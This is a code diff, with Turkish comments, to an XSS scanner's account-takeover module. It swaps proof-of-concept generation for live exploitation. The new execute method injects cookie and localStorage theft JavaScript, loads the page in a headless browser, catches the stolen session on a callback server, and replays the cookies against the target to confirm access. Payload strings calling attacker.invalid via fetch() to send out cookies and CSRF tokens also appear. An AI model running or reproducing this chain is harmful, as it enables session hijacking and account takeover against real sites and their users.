@@ -710,11 +710,26 @@ class XSSScanner(BaseScanner):
                 reflection_quality=round(rq_score, 3),
                 **{k: v for k, v in hit.items() if k not in ("confidence", "detection_method")},
             )
-            # XSS -> ATO PoC for every confirmed finding
+            # XSS -> ATO: DOM onaylıysa gerçek cookie theft dene
             if dom_confirmed:
-                ato = ato_gen.generate_poc(url, param_name, hit.get("payload", ""))
+                xss_payload_used = hit.get("payload", "")
+                # 1. Gerçek execution — callback server ile cookie theft
+                captured = ato_gen.execute(
+                    xss_url=url,
+                    param=param_name,
+                    xss_payload=xss_payload_used,
+                    results=self.results,
+                )
+                # 2. Bulguya ATO bilgisini ekle (gerçek capture veya PoC)
+                ato = ato_gen.generate_poc(url, param_name, xss_payload_used)
                 ato["verified"] = True
                 ato["detection_method"] = "dom_playwright"
+                ato["ato_executed"] = captured is not None
+                ato["ato_verified"] = captured.verified if captured else False
+                if captured:
+                    ato["ato_cookie_count"] = len(captured.cookies)
+                    ato["ato_ls_keys"] = len(captured.local_storage)
+                    ato["ato_raw_cookie"] = captured.raw_cookie_str[:200]
                 self.report_finding(severity="Critical", **ato)
 
     def _dom_verify_xss(self, url: str, param_name: str, payload: str) -> bool:
@@ -1472,19 +1487,27 @@ class BlindXSSProber:
 
 class XSSToATOChain:
     """
-    XSS -> Account Takeover PoC generator.
-    Given a confirmed XSS, produces cookie-steal, CSRF-token-steal,
-    localStorage-steal, and email-change PoC payloads.
-    Single Responsibility: ATO exploitation chain generation only.
+    XSS → Account Takeover gerçek execution motoru.
+
+    DOM confirmed her XSS bulgusu için:
+      1. Lokal HTTP callback sunucusu başlatır (127.0.0.1:random)
+      2. Gerçek cookie/localStorage theft payload'u üretir
+      3. Playwright/Selenium ile hedef sayfayı açar ve payload'u çalıştırır
+      4. Sunucuya gelen callback'i bekler (timeout: 15s)
+      5. Çalınan cookie'yi hedef origin'e karşı doğrular
+      6. Sonucu "sessions" bucket'ına yazar
     """
 
-    @staticmethod
+    CALLBACK_TIMEOUT = 15  # saniye
+
     def generate_poc(
+        self,
         xss_url: str,
         param: str,
         payload: str,
         attacker_host: str = "attacker.invalid",
     ) -> Dict[str, Any]:
+        """Backward-compat: PoC şablonu üret (callback sunucusu olmadan)."""
         uid = uuid.uuid4().hex[:8]
         h = attacker_host
         return {
@@ -1500,14 +1523,6 @@ class XSSToATOChain:
                     "payload": (
                         f"<img src=x onerror=\"fetch('http://{h}/steal?s={uid}"
                         f"&c='+encodeURIComponent(document.cookie),{{mode:'no-cors'}})\">"
-                    ),
-                },
-                "csrf_token_steal": {
-                    "description": "CSRF token + settings page exfiltration",
-                    "payload": (
-                        f"<img src=x onerror=\"fetch(location.origin+'/api/user/settings',"
-                        f"{{credentials:'include'}}).then(r=>r.text()).then(d=>"
-                        f"fetch('http://{h}/csrf?s={uid}&d='+btoa(d),{{mode:'no-cors'}}))\">"
                     ),
                 },
                 "localstorage_steal": {
@@ -1533,3 +1548,191 @@ class XSSToATOChain:
             "severity": "Critical",
             "confidence": "high",
         }
+
+    def execute(
+        self,
+        xss_url: str,
+        param: str,
+        xss_payload: str,
+        results: Optional[Dict] = None,
+        driver=None,
+    ) -> Optional["CapturedSession"]:  # type: ignore[name-defined]
+        """
+        Gerçek cookie theft yürüt.
+
+        Adımlar:
+        1. Callback sunucusunu başlat
+        2. Steal payload'unu XSS URL'sine enjekte et
+        3. Playwright ile sayfayı aç (veya Selenium, veya requests)
+        4. Callback bekle (15s)
+        5. Session doğrula
+        6. Sonucu sessions bucket'ına yaz
+        """
+        try:
+            from websecure.core.xss_callback import (
+                XSSCallbackServer, CapturedSession,
+                parse_cookie_str, parse_storage_str,
+            )
+        except ImportError:
+            logger.warning("[ATO] xss_callback modülü bulunamadı")
+            return None
+
+        srv = XSSCallbackServer()
+        try:
+            srv.start()
+        except Exception as e:
+            logger.warning(f"[ATO] Callback sunucusu başlatılamadı: {e!r}")
+            return None
+
+        try:
+            token = srv.new_token()
+            steal_js = srv.steal_payload(token, include_storage=True)
+            img_payload = srv.steal_img_payload(token)
+
+            # XSS URL'sine steal JS'i enjekte et
+            injected_url = self._inject_payload(xss_url, param, f"<script>{steal_js}</script>")
+            injected_url_img = self._inject_payload(xss_url, param, img_payload)
+
+            logger.info(f"[ATO] Callback bekleniyor — {srv.base_url}/steal?t={token[:8]}...")
+
+            # Yöntem 1: Playwright (en güvenilir)
+            if not self._try_playwright(injected_url, steal_js):
+                # Yöntem 2: Selenium driver
+                if driver and not self._try_selenium(driver, injected_url):
+                    # Yöntem 3: requests (sadece server-side render)
+                    self._try_requests(injected_url_img)
+
+            # Callback bekle
+            raw = srv.wait(token, timeout=self.CALLBACK_TIMEOUT)
+            if not raw:
+                logger.info(f"[ATO] Callback gelmedi ({self.CALLBACK_TIMEOUT}s timeout) — {xss_url}")
+                return None
+
+            # Veriyi parse et
+            raw_cookie = raw.get("c", "")
+            cookies = parse_cookie_str(raw_cookie)
+            ls = parse_storage_str(raw.get("ls", ""))
+            ss = parse_storage_str(raw.get("ss", ""))
+            origin = raw.get("u", xss_url)
+
+            # Session oluştur
+            sess = CapturedSession(
+                token=token,
+                cookies=cookies,
+                local_storage=ls,
+                session_storage=ss,
+                raw_cookie_str=raw_cookie,
+                origin_url=origin,
+                xss_url=xss_url,
+                xss_param=param,
+                xss_payload=xss_payload,
+                source="xss_dom" if driver else "xss_reflected",
+            )
+
+            # Doğrulama — çalınan cookie ile origin'e istek at
+            sess = self._verify_session(sess)
+
+            # Bucket'a yaz
+            if results is not None:
+                try:
+                    from websecure.core.reporting import add_result
+                    add_result("sessions", sess.to_dict())
+                except Exception as e:
+                    logger.debug(f"[ATO] add_result hatası: {e!r}")
+
+            status = "DOĞRULANDI" if sess.verified else "yakalandı (doğrulanamadı)"
+            logger.warning(
+                f"[ATO] Session {status}! "
+                f"URL={xss_url} param={param} "
+                f"cookie_count={len(cookies)} ls_keys={len(ls)}"
+            )
+            return sess
+
+        finally:
+            srv.stop()
+
+    # ------------------------------------------------------------------ #
+    # Yardımcı metodlar
+    # ------------------------------------------------------------------ #
+
+    @staticmethod
+    def _inject_payload(url: str, param: str, payload: str) -> str:
+        """Payload'u URL parametresine enjekte et."""
+        from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
+        parsed = urlparse(url)
+        params = dict(parse_qsl(parsed.query))
+        if param and param in params:
+            params[param] = payload
+        elif param:
+            params[param] = payload
+        else:
+            # Parametre yoksa fragment'a ekle (DOM XSS senaryosu)
+            return url + ("&" if "?" in url else "?") + f"__ws={payload}"
+        return urlunparse(parsed._replace(query=urlencode(params)))
+
+    @staticmethod
+    def _try_playwright(url: str, steal_js: str) -> bool:
+        """Playwright ile sayfayı aç, steal JS'i çalıştır."""
+        try:
+            from playwright.sync_api import sync_playwright
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
+                ctx = browser.new_context(ignore_https_errors=True)
+                page = ctx.new_page()
+                try:
+                    page.goto(url, timeout=10000, wait_until="domcontentloaded")
+                    # Payload inject edilmemişse JS ile çalıştır
+                    page.evaluate(steal_js)
+                    page.wait_for_timeout(3000)  # callback için bekle
+                except Exception:
+                    pass
+                finally:
+                    browser.close()
+            return True
+        except Exception as e:
+            logger.debug(f"[ATO] Playwright başarısız: {e!r}")
+            return False
+
+    @staticmethod
+    def _try_selenium(driver, url: str) -> bool:
+        """Selenium driver ile sayfayı aç."""
+        try:
+            driver.get(url)
+            import time as _t
+            _t.sleep(3)
+            return True
+        except Exception as e:
+            logger.debug(f"[ATO] Selenium başarısız: {e!r}")
+            return False
+
+    @staticmethod
+    def _try_requests(url: str) -> bool:
+        """Requests ile URL'ye istek at (server-side render için)."""
+        try:
+            import requests
+            requests.get(url, timeout=5, verify=False)
+            return True
+        except Exception:
+            return False
+
+    @staticmethod
+    def _verify_session(sess: "CapturedSession") -> "CapturedSession":  # type: ignore[name-defined]
+        """Çalınan cookie ile hedef origin'e istek at — erişim doğrula."""
+        if not sess.cookies or not sess.origin_url:
+            return sess
+        try:
+            import requests
+            from urllib.parse import urlparse
+            origin = urlparse(sess.origin_url)
+            base = f"{origin.scheme}://{origin.netloc}"
+            r = requests.get(
+                base, cookies=sess.cookies,
+                timeout=5, verify=False, allow_redirects=True,
+            )
+            sess.verified = r.status_code < 400
+            sess.verification_url = base
+            sess.verification_status = r.status_code
+            logger.info(f"[ATO] Doğrulama: {base} → HTTP {r.status_code} {'OK' if sess.verified else 'FAIL'}")
+        except Exception as e:
+            logger.debug(f"[ATO] Doğrulama hatası: {e!r}")
+        return sess
